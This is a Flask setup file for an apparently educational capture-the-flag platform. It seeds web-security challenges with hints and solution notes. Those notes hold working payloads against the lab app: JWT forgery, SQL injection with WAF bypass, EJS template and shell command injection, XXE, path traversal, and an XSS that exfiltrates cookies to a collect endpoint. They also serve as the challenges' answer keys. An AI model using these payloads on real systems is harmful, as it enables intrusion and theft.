"""
Flask Challenge Platform — Garden Fresh Lab Board
"""
import os
import json
import logging
from flask import Flask
from sqlalchemy.pool import NullPool
from sqlalchemy import exc as sa_exc
from .extensions import db, login_manager


def create_app():
    app = Flask(__name__, template_folder='templates', static_folder='static')

    # Configuration
    app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', 'flask_dev_secret')
    app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get(
        'DATABASE_URL', 'sqlite:////platform-data/platform.db'
    )
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    # Enable template auto-reload so file changes are reflected without restart.
    # This is safe in production and required when the templates directory is
    # bind-mounted from the host (docker-compose live-edit workflow).
    app.config['TEMPLATES_AUTO_RELOAD'] = os.environ.get('TEMPLATES_AUTO_RELOAD', 'false').lower() == 'true'
    # NullPool disables connection pooling so SQLite file handles are opened and
    # closed per-use rather than held in a pool. This prevents workers from
    # inheriting stale file descriptors after gunicorn forks from the master
    # process (which ran db.create_all() during the factory call).
    app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {'poolclass': NullPool}

    # Initialize extensions
    db.init_app(app)
    login_manager.init_app(app)
    login_manager.login_view = 'auth.login'

    # Register blueprints
    from .routes.main import main_bp
    from .routes.auth import auth_bp
    from .routes.challenges import challenges_bp
    from .routes.exploit_server import exploit_server_bp
    from .routes.scoreboard import scoreboard_bp

    app.register_blueprint(main_bp, url_prefix='/platform')
    app.register_blueprint(auth_bp, url_prefix='/platform/auth')
    app.register_blueprint(challenges_bp, url_prefix='/platform/challenges')
    app.register_blueprint(exploit_server_bp, url_prefix='/platform/exploit-server')
    app.register_blueprint(scoreboard_bp, url_prefix='/platform/scoreboard')

    with app.app_context():
        try:
            db.create_all()
        except sa_exc.OperationalError:
            # Multiple workers can race create_all() on startup; ignore
            # "table already exists" errors — tables were created by another worker.
            pass
        _seed_database()

    return app


def _seed_database():
    """Seed the platform database from flags.json and challenge data."""
    from .models import Challenge, Flag

    # Load flags from flag-data volume
    flags_path = '/flag-data/flags.json'
    flags = {}
    if os.path.exists(flags_path):
        with open(flags_path) as f:
            flags = json.load(f)
        logging.info(f'[platform] Loaded {len(flags)} flags from {flags_path}')
    else:
        logging.warning(f'[platform] flags.json not found at {flags_path}')

    # Seed challenges if not present
    if Challenge.query.count() == 0:
        _seed_challenges()

    # Update flags (always refresh from flags.json on startup)
    _seed_flags(flags)


def _seed_challenges():
    """Seed the challenges table with all 21+1+1 challenges."""
    from .models import Challenge
    challenges = _get_challenge_seed_data()
    for c in challenges:
        challenge = Challenge(**c)
        db.session.add(challenge)
    db.session.commit()
    logging.info(f'[platform] Seeded {len(challenges)} challenges')


def _seed_flags(flags: dict):
    """Seed/update the flags table from flags.json.

    Also clears ExploitServerCollection data so soft resets provide a clean slate.
    """
    from .models import Challenge, Flag, ExploitServerCollection

    # Clear collected exploit data on every startup (soft reset clears exfil history)
    try:
        ExploitServerCollection.query.delete()
        db.session.commit()
        logging.info('[platform] Cleared exploit server collection data')
    except Exception as e:
        db.session.rollback()
        logging.warning(f'[platform] Could not clear exploit collections: {e}')

    code_map = {
        'auth01': 'AUTH-01', 'auth02': 'AUTH-02', 'auth03': 'AUTH-03', 'auth04': 'AUTH-04',
        'inj01': 'INJ-01', 'inj02': 'INJ-02', 'inj03': 'INJ-03', 'inj04': 'INJ-04',
        'bac01': 'BAC-01', 'bac02': 'BAC-02', 'bac03': 'BAC-03', 'bac04': 'BAC-04',
        'cs01': 'CS-01', 'cs02': 'CS-02', 'cs03': 'CS-03',
        'ss01': 'SS-01', 'ss02': 'SS-02', 'ss03': 'SS-03',
        'bl01': 'BL-01', 'bl02': 'BL-02', 'bl03': 'BL-03',
        'mission_alpha': 'MISSION-ALPHA',
        'bonus': 'BONUS',
    }

    for json_key, challenge_code in code_map.items():
        flag_value = flags.get(json_key)
        if not flag_value:
            continue

        challenge = Challenge.query.filter_by(code=challenge_code).first()
        if not challenge:
            continue

        existing = Flag.query.filter_by(challenge_id=challenge.id).first()
        if existing:
            existing.flag_value = flag_value
        else:
            db.session.add(Flag(challenge_id=challenge.id, flag_value=flag_value))

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        logging.error(f'[platform] Flag seed error: {e}')


def _get_challenge_seed_data():
    """Return the full challenge dataset."""
    return [
        # AUTH Track
        {
            'code': 'AUTH-01', 'track': 'auth',
            'title': 'JWT kid Path Traversal',
            'description_md': '## JWT kid Parameter Path Traversal\n\nThe JWT verification middleware loads the HMAC signing key from the filesystem path specified in the `kid` (Key ID) header. There is no validation of the path value.\n\n**Target endpoint:** `GET /api/manager/reports`\n\n**Your goal:** Forge a Manager-level JWT that is accepted by this endpoint.',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'The JWT `kid` header is supposed to identify which key to use for verification. What does this endpoint actually do with that value?',
            'hint_t2': 'The server loads the HMAC key from the filesystem path in `kid`. Try setting `kid` to `/dev/null`. What is the HMAC key when the file is empty?',
            'hint_t3': 'Set `kid: "/dev/null"` in the JWT header. Sign the token with an empty string as the HMAC secret. The verifier reads zero bytes from /dev/null — empty key. `jwt.sign(payload, Buffer.from(""), { algorithm: "HS256", header: { kid: "/dev/null" } })`',
            'solution_notes_md': 'Decode any existing JWT to see the `kid` header. Craft a new JWT with `kid: "/dev/null"`, `alg: "HS256"`, Manager role payload, signed with empty string.',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'AUTH-02', 'track': 'auth',
            'title': 'JWT RS256→HS256 Algorithm Confusion',
            'description_md': '## JWT Algorithm Confusion Attack\n\nThe application uses RS256 JWT signing. The public key is at `/.well-known/jwks.json`. A verification path exists that accepts HS256 tokens and uses the RSA public key bytes as the HMAC secret.\n\n**Target endpoint:** `GET /api/manager/promotions`',
            'difficulty': 'hard', 'points': 300,
            'hint_t1': 'The app uses RS256. But there is a second verification path for HS256. Where is the public key exposed?',
            'hint_t2': 'The public key is at `GET /.well-known/jwks.json`. When `alg: HS256`, the verifier uses the RSA public key bytes as the HMAC secret. You have the public key — you can sign HS256 tokens the server will accept.',
            'hint_t3': 'Fetch `/.well-known/jwks.json` — it returns a JWK object with `n` and `e` (base64url). Convert the JWK to PEM using `jwk-to-pem` (npm) or `from cryptography.hazmat...`. The verifier does raw HMAC-SHA256 with those PEM bytes as the secret (LF line endings). Build the token manually: `const sig = crypto.createHmac("sha256", Buffer.from(rsaPem)).update(headerB64+"."+payloadB64).digest("base64url"); const token = headerB64+"."+payloadB64+"."+sig;`. Submit to `/api/manager/promotions`.',
            'solution_notes_md': 'GET /.well-known/jwks.json → convert JWK (n/e) to PEM → raw HMAC-SHA256(header.payload, PEM_bytes) → craft HS256 token → Bearer to /api/manager/promotions',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'AUTH-03', 'track': 'auth',
            'title': 'Predictable Password Reset Token',
            'description_md': '## LCG-Based Reset Token Predictability\n\nThe password reset token is generated by a custom LCG seeded with `Date.now()`. The HTTP `Date` header leaks server time to the nearest second.\n\n**Target account:** `alice@example.com`',
            'difficulty': 'moderate', 'points': 250,
            'hint_t1': 'The reset token is generated by a PRNG. What information does the server leak that would help you predict the seed?',
            'hint_t2': 'LCG: `token = (1664525 * Date.now() + 1013904223) % 2^32`. The response `Date` header is accurate to the second. Enumerate ~3000 millisecond candidates spanning ±1 second.',
            'hint_t3': 'POST /api/auth/reset-request with alice@example.com; read the response Date header. Generate 3000 candidates; POST each to /api/auth/reset-confirm.',
            'solution_notes_md': 'Trigger reset → capture Date header → enumerate 3000 LCG outputs → find valid token → set new password → login → GET /api/user/profile → flag',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'AUTH-04', 'track': 'auth',
            'title': 'Login Rate-Limit Bypass via X-Forwarded-For',
            'description_md': '## IP-Based Rate Limit Bypass\n\nThe login endpoint locks out IPs after 10 failed attempts. The limiter reads the client IP from `X-Forwarded-For` without validation.\n\n**Wordlist:** `platform/wordlists/staff_passwords.txt` (500 entries)',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'The rate limiter determines your IP from a header. Which header, and is it validated?',
            'hint_t2': 'The rate limiter reads `X-Forwarded-For` directly. Rotate a unique value per request. Wordlist: platform/wordlists/staff_passwords.txt.',
            'hint_t3': 'For each password in staff_passwords.txt, send POST /api/auth/login with `X-Forwarded-For: 10.0.0.<n>` (increment n). Target: `staff.bot@garden.lab`. Flag in GET /api/staff/queue.',
            'solution_notes_md': 'Loop over wordlist with rotating X-Forwarded-For → find credential → GET /api/staff/queue → flag',
            'is_hidden': False, 'is_mission': False,
        },
        # INJ Track
        {
            'code': 'INJ-01', 'track': 'injection',
            'title': 'Second-Order SQL Injection',
            'description_md': '## Second-Order SQL Injection via Username\n\nA SQL fragment registered as a username is stored safely but executes when the Staff report generator assembles a writable-CTE query from raw usernames.\n\n**Registration:** Usernames stored verbatim without sanitization.\n**Trigger:** staff_bot report every 60s builds a CTE using raw usernames.\n**Exfil:** Writable-CTE UPDATE writes the INJ-01 flag into a target account\'s `bio` field.\n\n**Two registrations required:** (1) Register a victim account and note its UUID. (2) Register an attacker account whose username is the CTE injection payload targeting the victim UUID.',
            'difficulty': 'hard', 'points': 350,
            'hint_t1': 'The staff report builds a per-customer query by embedding each raw username into a single-row CTE. What SQL can you inject into the username field that closes the CTE, adds a writable UPDATE CTE, and still produces a valid statement?',
            'hint_t2': "The per-row report template is: `WITH sampled_users AS ( SELECT '<username>' AS username, '<id>' AS user_id ) SELECT …`. Register a victim account first, note its UUID, then register an attacker account with username: `x' AS username, '' AS user_id), update_op AS (UPDATE users SET bio=(SELECT value FROM secrets WHERE key='inj01') WHERE id='<victim-uuid>' RETURNING 1) SELECT 1 --`",
            'hint_t3': "Two steps: (1) Register any account → GET /api/user/profile → note your UUID (victim). (2) Register a second account with username exactly: `x' AS username, '' AS user_id), update_op AS (UPDATE users SET bio=(SELECT value FROM secrets WHERE key='inj01') WHERE id='<victim-uuid>' RETURNING 1) SELECT 1 --`. Wait 60s for staff_bot cycle. Login as the victim account and GET /api/user/profile — bio now contains the INJ-01 flag.",
            'solution_notes_md': "Register victim account → note UUID → register attacker account with writable-CTE payload targeting victim UUID → wait 60s for staff_bot cycle → login as victim → GET /api/user/profile → bio = INJ-01 flag",
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'INJ-02', 'track': 'injection',
            'title': 'SQL Injection via JSON Body Parameter',
            'description_md': '## SQL Injection with WAF Bypass\n\nOrder-search uses a raw SQL query. WAF blocks `UNION SELECT`.\n\n**Bypass:** `UNION/**/SELECT`, `UNION%0aSELECT`, `UnIoN SeLeCt`\n\n**Target:** `POST /api/orders/search`',
            'difficulty': 'moderate', 'points': 250,
            'hint_t1': 'The search endpoint has SQLi. The WAF blocks `UNION SELECT`. What bypass techniques exist?',
            'hint_t2': 'Try inline comments: `UNION/**/SELECT`. Or alternate whitespace. The WAF matches specific patterns only.',
            'hint_t3': 'POST {"query": "x\' UNION/**/SELECT value,null,null,null FROM secrets WHERE key=\'inj02\'--"} to /api/orders/search.',
            'solution_notes_md': 'UNION/**/SELECT bypass → extract flag from secrets table',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'INJ-03', 'track': 'injection',
            'title': 'EJS Server-Side Template Injection',
            'description_md': '## EJS SSTI via display_name\n\nEmail preview renders EJS template using your `display_name` without sanitization.\n\n**Probe:** Set `display_name` to `<%= 7*7 %>`. "49" in response confirms SSTI.',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'The email preview renders your display_name via a template engine. Is it sanitized?',
            'hint_t2': 'Set display_name to `<%= 7*7 %>` via PUT /api/user/profile. Call GET /api/user/email-preview. "49" confirms RCE.',
            'hint_t3': "PUT display_name to `<%= global.process.mainModule.require('child_process').execSync('cat /app/flags/inj03.txt').toString() %>`. Then GET /api/user/email-preview.",
            'solution_notes_md': 'Set EJS RCE payload as display_name → call /api/user/email-preview → flag in response',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'INJ-04', 'track': 'injection',
            'title': 'Command Injection in Image Thumbnail Generator',
            'description_md': '## Command Injection via Filename\n\nThumbnail generator passes filename to `execSync` without sanitization. Semicolons filtered; pipes and backticks are not.',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'The image processor uses shell commands with the filename. Semicolons and forward-slashes are filtered — what else works?',
            'hint_t2': 'Backtick substitution is not filtered. The shell runs with working directory `/app`. The flags file is at `/app/flags/inj04.txt`. How do you reach it without using `/` in the filename?',
            'hint_t3': 'Upload a file named `` `cd flags&&cat inj04.txt`.jpg ``. The shell expands the backtick: `cd flags` navigates from `/app` to `/app/flags/`, then `cat inj04.txt` reads the flag. The value appears in the convert error response.',
            'solution_notes_md': 'Upload backtick-injection filename (slash-free: `cd flags&&cat inj04.txt`) → convert error response contains flag',
            'is_hidden': False, 'is_mission': False,
        },
        # BAC Track
        {
            'code': 'BAC-01', 'track': 'bac',
            'title': 'IDOR via UUID v1 Timestamp Prediction',
            'description_md': '## UUID v1 IDOR Enumeration\n\nOrder receipt endpoint has no ownership check. Order IDs are UUID v1 with fixed clock_seq=0x1234 and fixed node.\n\n**Anchor:** GET /api/orders/recent shows delivered orders with second-truncated timestamps.\n**Target:** Admin-owned confirmed order (excluded from /recent).',
            'difficulty': 'hard', 'points': 350,
            'hint_t1': 'The app uses UUID v1. What does UUID v1 embed, and what does /api/orders/recent expose?',
            'hint_t2': 'UUID v1 encodes a timestamp. Enumerate ~3000 UUID candidates for the ±1s window around a reference timestamp from /recent.',
            'hint_t3': 'Get reference UUID from /api/orders/recent. Extract timestamp. For each ms in [ts-1000, ts+1000], generate UUID v1 with clock_seq=0x1234. Try GET /api/orders/{candidate}/receipt.',
            'solution_notes_md': 'Fetch /api/orders/recent → enumerate ±1s UUID candidates → find Admin order receipt → flag',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'BAC-02', 'track': 'bac',
            'title': 'Mass Assignment — Role Elevation',
            'description_md': '## Mass Assignment via Profile Update\n\nPUT /api/user/profile accepts a `role` field — silently elevates your role.\n\nAfter elevating to `staff`, log out and log back in. The login response issues a `staffSessionProof` cookie (HttpOnly).',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'Compare fields in GET /api/user/profile response with what you can send in PUT /api/user/profile.',
            'hint_t2': 'PUT /api/user/profile with {"role": "staff"}. After elevation, log out and log back in — Staff Order Queue contains the flag.',
            'hint_t3': 'PUT {"role":"staff"} → GET /api/user/profile to confirm → logout → login → GET /api/staff/queue → flag',
            'solution_notes_md': 'PUT {"role":"staff"} → logout → login → GET /api/staff/queue → flag + staffSessionProof cookie',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'BAC-03', 'track': 'bac',
            'title': 'BOLA in GraphQL Resolver',
            'description_md': '## Broken Object-Level Authorization in GraphQL\n\nGraphQL resolver does not check ownership. Introspection reveals an `adminNotes` field on orders.\n\n**Endpoint:** POST /api/graphql',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'GraphQL introspection is enabled. What fields exist on the Order type?',
            'hint_t2': 'Query the schema to find the `adminNotes` field. The resolver has no ownership check.',
            'hint_t3': 'query { order(id: "<admin-order-id>") { id adminNotes } }. Find Admin-owned order from /api/orders/recent.',
            'solution_notes_md': 'Introspect → discover adminNotes → query Admin order → BAC-03 flag in adminNotes',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'BAC-04', 'track': 'bac',
            'title': 'Path Traversal via Double URL Encoding',
            'description_md': '## Double-Encoded Path Traversal\n\nFile download endpoint has two decode steps:\n1. Validation: framework-decoded value (Express does one decode)\n2. File-serving: applies additional decodeURIComponent()\n\nDouble-encode separators: `%252F` → `%2F` (passes validation) → `/` (traversal).',
            'difficulty': 'hard', 'points': 300,
            'hint_t1': 'The file download validates the filename. Single-encoded traversal is caught. What if you encode the % itself?',
            'hint_t2': 'Double-encode: `/` → `%2F` → `%252F`. The validation step sees `%2F` (no traversal), the file-server decodes it to `/`. Flag at `/app/flags/bac04.txt`.',
            'hint_t3': 'GET /api/orders/files/download?filename=%252F..%252F..%252Fapp%252Fflags%252Fbac04.txt',
            'solution_notes_md': 'Double-encode %2F as %252F in path separators → bypass validation → file server decodes → traversal',
            'is_hidden': False, 'is_mission': False,
        },
        # CS Track
        {
            'code': 'CS-01', 'track': 'client_side',
            'title': 'Stored XSS with CSP Bypass via JSONP',
            'description_md': '## Stored XSS — JSONP Same-Origin Script Injection\n\n`<script src="/api/products/search?callback=...">` is WAF PERMITTED (same-origin) and CSP PERMITTED (JSONP endpoint in allowlist). The callback parameter executes as code.\n\n**Vector:** Product review with JSONP src-tag. admin_bot visits reviews page. Admin cookie (NOT HttpOnly) is exfiltrated.',
            'difficulty': 'hard', 'points': 400,
            'hint_t1': 'Inline script tags are blocked. What other way can you execute JavaScript that both the WAF and CSP allow?',
            'hint_t2': '`<script src="/api/products/search?callback=...">` is permitted. The callback wraps in the response. Exfiltrate document.cookie.',
            'hint_t3': 'Submit review: `<script src="/api/products/search?callback=fetch(\'/platform/exploit-server/collect?c=\'+document.cookie)//"></script>`. Wait 60s. Check exploit-server collect panel.',
            'solution_notes_md': 'JSONP src-tag XSS in review → manager_bot approves → admin_bot fires → cookie exfiltrated → CS-01 flag in cookie',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'CS-02', 'track': 'client_side',
            'title': 'DOM XSS via window.postMessage',
            'description_md': '## DOM XSS via Unchecked postMessage\n\n`/orders/track` listens for postMessage without origin check; injects `event.data` into innerHTML. NO CSP on this page.\n\nHost attack page at garden.lab:8081 (different origin; admin cookie sent via same-site). Iframe → postMessage → innerHTML injection → flag.',
            'difficulty': 'hard', 'points': 400,
            'hint_t1': 'The /orders/track widget receives postMessage without an origin check. What does it do with event.data?',
            'hint_t2': 'No origin check. event.data → innerHTML. No CSP. Embed /orders/track in iframe from garden.lab:8081; admin cookie delivered (same-site).',
            'hint_t3': 'Create page at :8081 → iframe loads /orders/track → after load: iframe.contentWindow.postMessage(\'<img src=x onerror="fetch(...)">\',"*") → exfil to /collect.',
            'solution_notes_md': 'Attack page at :8081 → iframe /orders/track with admin cookie → postMessage → innerHTML → exfil flag',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'CS-03', 'track': 'client_side',
            'title': 'CSRF on Account Email Change',
            'description_md': '## GET-Based CSRF — Email Change\n\nEmail change uses GET. Session cookie is SameSite=Lax.\n\nLax permits cross-site top-level GET navigation. Strict blocks it.\n\n**Attack:** attacker.lab page navigates to GET /api/user/email-change?new_email=...',
            'difficulty': 'moderate', 'points': 250,
            'hint_t1': 'The email change is a GET request. The session cookie is SameSite=Lax. What does Lax permit for top-level cross-site navigation?',
            'hint_t2': 'Create page at attacker.lab with navigation to http://garden.lab/api/user/email-change?new_email=pwned@evil.com. Submit to bot queue.',
            'hint_t3': 'Create cross-site exploit page with redirect: `window.location = "http://garden.lab/api/user/email-change?new_email=hacked@evil.com"`. Submit attacker.lab URL to bot queue.',
            'solution_notes_md': 'CSRF page at attacker.lab → admin_bot navigates → Lax allows → email changed → GET /api/challenges/cs03/flag → flag',
            'is_hidden': False, 'is_mission': False,
        },
        # SS Track
        {
            'code': 'SS-01', 'track': 'server_side',
            'title': 'Blind SSRF via Webhook URL',
            'description_md': '## Blind SSRF — Internal Redis Commander\n\nWebhook registration fetches the URL server-side. `redis-commander:8081` is on the internal Docker network.\n\n**Step 1 — list keys:** Register a webhook pointing to `http://redis-commander:8081/apiv2/keystree/R:redis:6379:0`. The `body_preview` in the response shows all Redis keys.\n\n**Step 2 — read flag:** Register a second webhook pointing to `http://redis-commander:8081/apiv2/key/R:redis:6379:0/garden:ss01_flag`. The flag value appears in `body_preview`.',
            'difficulty': 'moderate', 'points': 250,
            'hint_t1': 'The webhook URL is fetched server-side immediately after registration. What internal services are on the app-internal network? Check the `test_result` field in the response.',
            'hint_t2': 'Register webhook: {"url": "http://redis-commander:8081/apiv2/keystree/R:redis:6379:0"}. The body_preview shows all Redis keys — look for the garden: prefix keys.',
            'hint_t3': 'Two requests: (1) POST /api/webhooks {"url":"http://redis-commander:8081/apiv2/keystree/R:redis:6379:0"} → find the flag key name in body_preview. (2) POST /api/webhooks {"url":"http://redis-commander:8081/apiv2/key/R:redis:6379:0/garden:ss01_flag"} → flag value in body_preview.',
            'solution_notes_md': 'POST webhook to /apiv2/keystree/R:redis:6379:0 → read body_preview to find key name → POST webhook to /apiv2/key/R:redis:6379:0/garden:ss01_flag → SS-01 flag in body_preview',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'SS-02', 'track': 'server_side',
            'title': 'XXE via File URI Entity',
            'description_md': '## XML External Entity via file:// URI\n\n**Access requirement:** The bulk-import endpoint requires a Manager or Admin JWT. Obtain one first via AUTH-01 (kid path traversal) or AUTH-02 (RS256→HS256 algorithm confusion), then use it here.\n\nXML import has external entity processing enabled. WAF blocks http/https URIs but NOT file://.\n\n```xml\n<?xml version="1.0"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/flags/ss02.txt">]>\n<import>&xxe;</import>\n```',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'The bulk-import endpoint is Manager/Admin only. Forge a Manager JWT via AUTH-01 (kid path traversal to HMAC key) or AUTH-02 (RS256→HS256 algorithm confusion), then POST the XXE payload.',
            'hint_t2': 'With a Manager JWT: the XML import accepts external entities. The WAF blocks http/https. What other URI schemes read local files? Flag at `/app/flags/ss02.txt`.',
            'hint_t3': 'POST /api/products/bulk-import with Manager/Admin Authorization header and XML body containing `<!ENTITY xxe SYSTEM "file:///app/flags/ss02.txt">` with `&xxe;` in a field — the entity value appears in the response.',
            'solution_notes_md': 'Forge Manager JWT (AUTH-01 or AUTH-02) → POST XXE payload to /api/products/bulk-import → file:// entity reads flag → SS-02 flag in response',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'SS-03', 'track': 'server_side',
            'title': 'File Upload Bypass to EJS Template Execution',
            'description_md': '## Double-Extension Upload Bypass\n\nUpload validates the LAST extension. Preview derives "effective type" by stripping last extension: `payload.ejs.jpg` → effective `.ejs` → `ejs.render()` executes.',
            'difficulty': 'hard', 'points': 350,
            'hint_t1': 'Upload validates last extension. The preview checks a different part. Can you exploit this mismatch?',
            'hint_t2': 'Upload `payload.ejs.jpg` (MIME: image/jpeg). Validator accepts (last ext = .jpg). Preview strips .jpg → effective .ejs → ejs.render().',
            'hint_t3': "Create file `payload.ejs.jpg` containing EJS: `<%= global.process.mainModule.require('fs').readFileSync('/app/flags/ss03.txt','utf8') %>`. Upload it. Access the preview URL returned in the upload response.",
            'solution_notes_md': "Upload payload.ejs.jpg containing `<%= global.process.mainModule.require('fs').readFileSync('/app/flags/ss03.txt','utf8') %>` → GET /api/products/image-preview?file=<stored_name> → EJS executes → SS-03 flag in response body",
            'is_hidden': False, 'is_mission': False,
        },
        # BL Track
        {
            'code': 'BL-01', 'track': 'business_logic',
            'title': 'Negative Quantity Order',
            'description_md': '## Server-Side Validation Absent: Negative Quantity\n\nOrder form has client-side quantity ≥ 1 guard. Server has no sign check.\n\nIntercept POST /api/orders and change quantity to -1. `debug_flag` appears when total < 0.',
            'difficulty': 'moderate', 'points': 100,
            'hint_t1': 'Client-side validation rejects negatives. What tool lets you modify requests after they leave the browser?',
            'hint_t2': 'Intercept POST /api/orders in Burp/ZAP. Change quantity to -1. Server does not validate sign.',
            'hint_t3': 'POST /api/orders with {"items": [{"product_id": 1, "quantity": -1}]}. Look for `debug_flag` in response.',
            'solution_notes_md': 'Intercept order POST → change quantity to -1 → debug_flag in response',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'BL-02', 'track': 'business_logic',
            'title': 'Coupon Race Condition',
            'description_md': '## Race Condition — Single-Use Coupon\n\nCoupon uses_remaining decremented AFTER order recorded. Multiple concurrent requests all see uses_remaining > 0.\n\n**Target:** Coupon code `FREESHIP` (single-use). Second+ application returns flag in `X-Flag` header.',
            'difficulty': 'hard', 'points': 300,
            'hint_t1': 'What happens between "checking if a coupon is valid" and "marking it used"? What if two requests happen simultaneously?',
            'hint_t2': 'Send 10+ concurrent POST /api/orders requests all using coupon FREESHIP. Multiple succeed before the decrement fires.',
            'hint_t3': 'Use concurrent requests (asyncio/ThreadPoolExecutor). Send 10 simultaneous requests with coupon_code="FREESHIP". Check X-Flag header.',
            'solution_notes_md': '10 concurrent requests with FREESHIP → multiple succeed → X-Flag on 2nd+ response',
            'is_hidden': False, 'is_mission': False,
        },
        {
            'code': 'BL-03', 'track': 'business_logic',
            'title': 'Loyalty Points Integer Overflow',
            'description_md': '## Int32 Bitwise Coercion Overflow\n\nLoyalty calculation: `(unit_price_cents * quantity) | 0` coerces to Int32 — wraps to negative for large values. Payout checks `loyaltyDelta !== 0` (not > 0).',
            'difficulty': 'moderate', 'points': 200,
            'hint_t1': 'How does JavaScript handle very large integers? What does `| 0` do?',
            'hint_t2': '`| 0` coerces to Int32. For price 850, find Q such that `(850 * Q) | 0` is negative. Try Q ≈ 2528895.',
            'hint_t3': 'POST /api/orders with {"items": [{"product_id": 1, "quantity": 2528895}]}. Look for loyalty_payout.flag.',
            'solution_notes_md': 'Large quantity → Int32 overflow in loyalty → negative delta ≠ 0 → payout → BL-03 flag',
            'is_hidden': False, 'is_mission': False,
        },
        # Mission
        {
            'code': 'MISSION-ALPHA', 'track': 'mission',
            'title': 'Garden Takeover — Admin Takeover Chain',
            'description_md': '## MISSION-ALPHA: Customer to Admin (3 Flags Required)\n\nThree-step causal chain.\n\n**Required flags (in order):**\n1. BL-03 flag\n2. BAC-02 flag\n3. MISSION-ALPHA master flag\n\n**Step 3 gate:** GET /api/admin/config requires valid Admin JWT (kid=/dev/null) AND staffSessionProof cookie from Step 2.',
            'difficulty': 'hard', 'points': 1000,
            'hint_t1': 'Three vulnerability classes: business logic overflow, access control mass assignment, JWT auth bypass. Each step enables the next.',
            'hint_t2': 'Step 2 is critical: elevate to staff via BAC-02, log in. The login response issues staffSessionProof HttpOnly cookie — save it.',
            'hint_t3': 'Step 3: forge Admin JWT with kid="/dev/null" signed with empty string. Present JWT + staffSessionProof cookie to GET /api/admin/config. Without cookie: 403.',
            'solution_notes_md': 'BL-03 → BAC-02 → AUTH-01 Admin target → /api/admin/config → master flag',
            'is_hidden': False, 'is_mission': True, 'mission_step': None,
        },
        # Hidden bonus
        {
            'code': 'BONUS', 'track': 'auth',
            'title': 'Hidden Bonus Challenge',
            'description_md': '',
            'difficulty': 'moderate', 'points': 50,
            'hint_t1': None, 'hint_t2': None, 'hint_t3': None,
            'solution_notes_md': None,
            'is_hidden': True, 'is_mission': False,
        },
    ]
